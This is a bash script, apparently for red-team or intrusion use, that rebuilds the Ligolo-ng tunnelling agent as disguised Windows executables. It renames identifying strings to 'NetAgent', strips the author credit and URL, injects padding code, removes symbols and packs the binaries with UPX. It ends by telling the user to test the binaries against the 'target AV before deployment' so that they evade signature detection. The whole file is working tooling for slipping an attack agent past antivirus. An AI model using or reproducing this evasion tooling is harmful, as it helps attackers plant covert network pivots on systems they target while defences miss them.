#!/bin/bash

# Final Ligolo-ng Stealth Builder
# Creates obfuscated Windows agents

set -e

echo "============================================"
echo "  Ligolo-ng Final Stealth Builder"
echo "============================================"

# Check if we're in the right directory
if [ ! -f "cmd/agent/main.go" ]; then
    echo "[ERROR] Please run this script from the ligolo-ng root directory"
    exit 1
fi

# Backup and prepare
echo "[INFO] Preparing build environment..."
cp cmd/agent/main.go cmd/agent/main.go.original

# Apply string replacements
echo "[INFO] Applying string obfuscation..."
sed -i.bak \
    -e 's/Ligolo-ng/NetAgent/g' \
    -e 's/Made in France with love by @Nicocha30!/Network utility tool/g' \
    -e 's|https://github.com/nicocha30/ligolo-ng|https://github.com/user/netagent|g' \
    -e 's/connect to proxy/connect to server/g' \
    -e 's/Chrome\/103\.0\.0\.0/Chrome\/120.0.0.0/g' \
    cmd/agent/main.go

# Add padding after the imports section
echo "[INFO] Adding memory layout obfuscation..."
awk '
BEGIN { in_vars = 0; vars_done = 0 }
/^var \(/ { in_vars = 1; print; next }
/^\)/ && in_vars && !vars_done {
    print "\t// Memory layout obfuscation"
    print "\tpadVar1 = \"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation.\""
    print "\tpadVar2 = [2048]byte{0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50}"
    print "\tpadVar3 = make([]string, 1000)"
    print ")"
    print ""
    print "func init() {"
    print "\t// Prevent optimization of padding vars"
    print "\t_ = padVar1"
    print "\t_ = padVar2"
    print "\tfor i := range padVar3 {"
    print "\t\tpadVar3[i] = fmt.Sprintf(\"pad_%d_%x_%d\", i, i*17, i*i)"
    print "\t}"
    print "}"
    print ""
    in_vars = 0
    vars_done = 1
    next
}
{ print }
' cmd/agent/main.go > cmd/agent/main.go.tmp && mv cmd/agent/main.go.tmp cmd/agent/main.go

# Cleanup function
cleanup() {
    echo "[INFO] Cleaning up..."
    if [ -f cmd/agent/main.go.original ]; then
        mv cmd/agent/main.go.original cmd/agent/main.go
    fi
    rm -f cmd/agent/main.go.bak
}

trap cleanup EXIT

echo "[INFO] Building obfuscated Windows agents..."

# Create builds directory
mkdir -p builds

# Build 1: Standard obfuscated
echo "[INFO] Building builds/agent-stealth-final.exe..."
GOOS=windows GOARCH=amd64 go build \
    -ldflags="-s -w -X main.version=2.1.0 -X main.commit=final -X main.date=$(date +%Y%m%d)" \
    -trimpath \
    -o builds/agent-stealth-final.exe \
    cmd/agent/main.go

# Build 2: Alternative flags
echo "[INFO] Building builds/agent-stealth-alt.exe..."
GOOS=windows GOARCH=amd64 go build \
    -ldflags="-s -w -X main.version=2.1.1 -X main.commit=alt" \
    -buildmode=exe \
    -trimpath \
    -o builds/agent-stealth-alt.exe \
    cmd/agent/main.go

# UPX compression if available
if command -v upx >/dev/null 2>&1; then
    echo "[INFO] Creating UPX compressed versions..."

    cp builds/agent-stealth-final.exe builds/agent-stealth-final-upx.exe
    upx --best builds/agent-stealth-final-upx.exe >/dev/null 2>&1

    cp builds/agent-stealth-alt.exe builds/agent-stealth-alt-upx.exe
    upx --best builds/agent-stealth-alt-upx.exe >/dev/null 2>&1

    echo "[SUCCESS] UPX compression completed"
else
    echo "[WARNING] UPX not available, skipping compression"
fi

# Show results
echo ""
echo "Build Summary:"
echo "=============="
if ls builds/agent-stealth-*.exe >/dev/null 2>&1; then
    ls -lah builds/agent-stealth-*.exe | while read line; do
        filename=$(echo "$line" | awk '{print $9}' | sed 's|builds/||')
        size=$(echo "$line" | awk '{print $5}')
        printf "%-35s %8s\n" "$filename" "$size"
    done
else
    echo "No builds found!"
    exit 1
fi

echo ""
echo "Testing Recommendations:"
echo "========================"
echo "1. builds/agent-stealth-final-upx.exe     (Primary - full obfuscation + UPX)"
echo "2. builds/agent-stealth-alt-upx.exe       (Alternative - different flags + UPX)"
echo "3. builds/agent-stealth-final.exe         (If UPX is detected)"
echo "4. builds/agent-stealth-alt.exe           (Fallback option)"

echo ""
echo "Changes Applied:"
echo "================"
echo "✓ String obfuscation (Ligolo-ng → NetAgent, etc.)"
echo "✓ Memory layout padding (2KB+ of dummy data)"
echo "✓ Symbol stripping (-s -w flags)"
echo "✓ Path trimming (-trimpath)"
echo "✓ Custom version/build info"
echo "✓ UPX compression (if available)"

echo ""
echo "[SUCCESS] All builds completed!"
echo ""
echo "IMPORTANT: Test against your target AV before deployment."
echo "The memory layout has been significantly altered to evade signature detection."